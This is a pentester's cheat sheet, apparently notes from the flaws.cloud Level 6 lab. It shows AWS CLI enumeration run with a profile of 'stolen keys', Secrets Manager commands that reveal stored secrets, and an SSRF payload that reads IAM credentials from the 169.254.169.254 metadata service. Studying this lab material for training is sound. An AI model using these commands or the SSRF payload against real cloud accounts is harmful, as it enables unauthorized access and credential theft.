[*] Import Stolen Keys
	aws configure --profile NEWSTOLENNAME

[*] Enumerate our user
	aws --profile NEWSTOLENNAME sts get-caller-identity
	aws --profile NEWSTOLENNAME iam get-user

	Example:
	$ aws --profile NEWSTOLENENAME iam get-user
	{
	    "User": {
	        "Path": "/",
	        "UserName": "Level6",
	        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
	        "Arn": "arn:aws:iam::975426262029:user/Level6",
	        "CreateDate": "2017-02-26T23:11:16Z"
	    }
	}


[*] Enumerate policies for our user
	Assuming the above enumeration works, we will have an arn for user, use just the username
	aws --profile NEWSTOLENENAME iam list-attached-user-policies --user-name Level6
		Example:
		{
		    "AttachedPolicies": [
		        {
		            "PolicyName": "MySecurityAudit",
		            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
		        },
		        {
		            "PolicyName": "list_apigateways",
		            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
		        }
		    ]
		}
	Now use the PolicyArn to obtain the version of the policy
	aws --profile NEWSTOLENENAME iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
		Example:
		{
		    "Policy": {
		        "PolicyName": "list_apigateways",
		        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
		        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
		        "Path": "/",
		        "DefaultVersionId": "v4",
		        "AttachmentCount": 1,
		        "PermissionsBoundaryUsageCount": 0,
		        "IsAttachable": true,
		        "Description": "List apigateways",
		        "CreateDate": "2017-02-20T01:45:17Z",
		        "UpdateDate": "2017-02-20T01:48:17Z",
		        "Tags": []
		    }
		}

	We have the policy arn and the version, let's read the policy.
	aws --profile NEWSTOLENENAME iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
		Example:
		{
		    "PolicyVersion": {
		        "Document": {
		            "Version": "2012-10-17",
		            "Statement": [
		                {
		                    "Action": [
		                        "apigateway:GET"
		                    ],
		                    "Effect": "Allow",
		                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
		                }
		            ]
		        },
		        "VersionId": "v4",
		        "IsDefaultVersion": true,
		        "CreateDate": "2017-02-20T01:48:17Z"
		    }
		}

[*] apigateway	
	The above information revealed we have access to an API Gateway. Let's build the full url
	The syntax we are trying to build is https://abcdef123.execute-api.us-east-2.amazonaws.com/my-function
	aws --profile flaws-6-2 --region us-west-2 lambda list-functions
		Example:
		{
		    "Functions": [
		        {
		            "FunctionName": "Level6",
		            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
		            "Runtime": "python2.7",
		            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
		            "Handler": "lambda_function.lambda_handler",
		            "CodeSize": 282,
		            "Description": "A starter AWS Lambda function.",
		            "Timeout": 3,
		            "MemorySize": 128,
		            "LastModified": "2017-02-27T00:24:36.054+0000",
		            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
		            "Version": "$LATEST",
		            "TracingConfig": {
		                "Mode": "PassThrough"
		            },
		            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
		            "PackageType": "Zip",
		            "Architectures": [
		                "x86_64"
		            ]
		        }
		    ]
		}

	Cool, we have a function called "Level6" If you see the FunctionName above. Let's get the Function's policy
	aws --profile flaws-6-2 --region us-west-2 lambda get-policy --function-name Level6
		Example:
		{
		    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
		    "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979"
		}
	Ok so now we know that we can execute arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6.
	The key piece here is s33ppypa75, our api id. So now our api gateway looks like:
	https://s33ppypa75.execute-api.us-west-2.amazonaws.com/my-function/Level6.
	Now we go looking at the api id, looking for the "my-function" stage id.
	aws --profile flaws-6-2 --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
		Example:
		{
		    "item": [
		        {
		            "deploymentId": "8gppiv",
		            "stageName": "Prod",
		            "cacheClusterEnabled": false,
		            "cacheClusterStatus": "NOT_AVAILABLE",
		            "methodSettings": {},
		            "tracingEnabled": false,
		            "createdDate": 1488155168,
		            "lastUpdatedDate": 1488155168
		        }
		    ]
		}
	Cool, we now know the full url for the api gateway:
	https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/Level6

[*] Quick commands to enumerate
	Account ID
		aws sts get-access-key-info --access-key-id AKIAEXAMPLE 
		aws sts get-access-key-info --profile
	Username of access key being used
		aws sts get-caller-identity --profile PROFILENAME
	List EC2 instances
		aws ec2 describe-instances --output text --profile PROFILENAME
	List EC2 instances in a region
		aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME
	List s3 buckets
		aws s3 ls --profile PROFILENAME
	List S3 buckets without logging into AWS account
		aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
	List EC2 but with jq to parse json
		aws ec2 describe-instances --output json --profile PROFILENAME | jq .Reservations[].Instances[].Tags[].Value	
	Secrets! list and reveal secrets
		aws secretsmanager list-secrets --profile PROFILENAME
		aws secretsmanager get-secret-value --secret-id NAME_FROM_list-secrets --profile PROFILENAME
		aws secretsmanager get-secret-value --secret-id NAME_FROM_list-secrets --region us-east-1 --profile PROFILENAME

[*] Terminology or useful tips
	AWS ARN - unique identifier - you will see in the AWS config file
	This is also helpful to track down ECR images
		arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>


[*] Metadata server:
	If SSRF is explotable or you have access to the VPC, query the metadata IP 169.254.169.254.
	Example:
		http://some.domain.dom/RedirectProxy/169.254.169.254/latest/meta-data/iam/security-credentials/app


